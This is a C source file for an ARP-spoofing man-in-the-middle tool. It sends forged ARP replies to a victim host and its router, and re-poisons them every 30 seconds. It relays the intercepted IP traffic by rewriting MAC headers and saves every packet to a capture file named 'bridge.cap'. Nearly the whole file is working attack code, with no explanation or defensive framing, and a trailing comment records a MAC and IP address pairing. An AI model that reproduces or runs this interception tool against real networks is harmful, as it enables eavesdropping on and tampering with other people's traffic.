#include <stdio.h>
#include "xlayer.h"
#include "datalink.h"
#include <signal.h>
#include <setjmp.h>

static char *pgmname ;
static void
usage(void){
  	fprintf(stderr,"ERROR: %s <src ip> <dest ip> <default gateway> <router>\n",pgmname);
	exit(1);
}
static void
ckerr(int rc, int ec,const char *szMsg)
{
 if(rc == ec){
 	fprintf(stderr,"%s: %s %s\n",pgmname,szMsg,
				(errno==0)?"":strerror(errno));
	exit(1);
 }				
} 
static sigjmp_buf j;
static sig_atomic_t canjmp;

void sig_int(int signo)
{
  if(canjmp)
	siglongjmp(j,1);
}

static int 
Bridge( const char* localip, const char *hostip, const char *dgip, const char* gip)
{
	uint32_t sip,hip,dg,g;
	struct MAC smac, hmac, gmac;
	struct layer *stack;
	struct datalink dl;
	struct sigaction act;
	xip iph;
	int n;
	time_t t1,t2;
	FILE *fp;
	act.sa_handler = sig_int;
	sigemptyset(&act.sa_mask);
	act.sa_flags = 0;
	if( sigsetjmp(j,1) == 1 ){
		fclose(fp);
		fprintf(stderr,"SIGINT sigjmp()\n");
		exit(0);
 	}
	canjmp=1;

	ckerr(sigaction(SIGINT,&act,NULL),-1,"ERROR: sigaction invalid\n");
	ckerr(if_menu(&dl),		   -1,"ERROR: Invalid interface specification");

	memcpy(smac.mac,dl.dl_mac,6);

	ckerr(str_to_ip(localip,&sip),	0,"ERROR: Invalid IP format for source");
	ckerr(str_to_ip(hostip,&hip),	0,"ERROR: Invalid IP format for host");
	ckerr(str_to_ip(dgip,&dg),		0,"ERROR: Invalid IP format for gateway");
	ckerr(str_to_ip(gip,&g),	 	0,"ERROR: Invalid IP format for router");
	ckerr( (( fp = fopen("bridge.cap","w") ) == NULL)?0:1,0,
		 "ERROR: could not open log file for writting ");
	ckerr(writelayers_pcap(NULL,1,dl.dl_pcap->linktype,fp),-1,
		"ERORR: writelayers_pcap:");

	fprintf(stderr,"\nfile ptr->%p\n",fp);
	ckerr(ARPRequest(&dl,&smac,&hmac,sip,hip,7),-1,"ERROR: no reply from host\n");
	ckerr(ARPRequest(&dl,&smac,&gmac,sip,g,7)  ,-1,"ERROR: no route to host\n");		
	ARPReply(&dl,&smac,dg,&hmac,hip);
	ARPReply(&dl,&smac,hip,&gmac,g);
	filterDatalink(&dl,"not arp");
	t1 = time(0);	
	while( 1 ){
		t2 = time(0);
		if(t1+30<=t2){ 
			t1 = t2; 	
			ARPReply(&dl,&smac,dg,&hmac,hip);
			ARPReply(&dl,&smac,hip,&gmac,g);
		}
		n=0;
		stack = recvlayers(&dl,&n);
		
		if( n > 0){

			if(stack->next->type != LT_IP){
					rmlayers(stack);
					continue;
			}

			iph = (xip)stack->next->proto;

			if( memcmp( &iph->ip_src,&hip,4) == 0 && memcmp(((xeth)stack->proto )->ether_shost, smac.mac,6) != 0 ){
					printf("from host %d bytes\n",n);
					memcpy(  ((xeth)stack->proto )->ether_shost, smac.mac,6);
					memcpy(  ((xeth)stack->proto )->ether_dhost, gmac.mac,6);
					sendlayers(&dl,stack);
					
					ckerr(
					writelayers_pcap(stack,0,
					dl.dl_pcap->linktype,fp),-1,
					"ERORR: writelayers_pcap:"
					);


					printlayers(stack);
					rmlayers(stack);	

			}

			if( memcmp( &iph->ip_dst,&hip,4) == 0 && memcmp(((xeth)stack->proto )->ether_shost, smac.mac,6) != 0 ){
					printf("to host %d bytes\n",n);
					memcpy(  ((xeth)stack->proto )->ether_shost,smac.mac,6);
					memcpy(  ((xeth)stack->proto )->ether_dhost,hmac.mac,6);
					sendlayers(&dl,stack);

					ckerr(
					writelayers_pcap(stack,0,
					dl.dl_pcap->linktype,fp),-1,
					"ERORR: writelayers_pcap:"
					);
					
					printlayers(stack);
					rmlayers(stack);
					
			}


		}
	}

	fclose(fp);
	//ARPReply(&gmac,dg,&hmac,hip);
	// ARPReply(&hmac,hip,&gmac,g);
	return 0;
}

int
main(int argc, char **argv)
{
	pgmname = *argv;
	if(argc < 4)
		usage();

	Bridge( argv[1], argv[2] , argv[3] , argv[4] );

	exit(0);
}


//00:50:BA:A8:18:D8 has 24.148.24.56
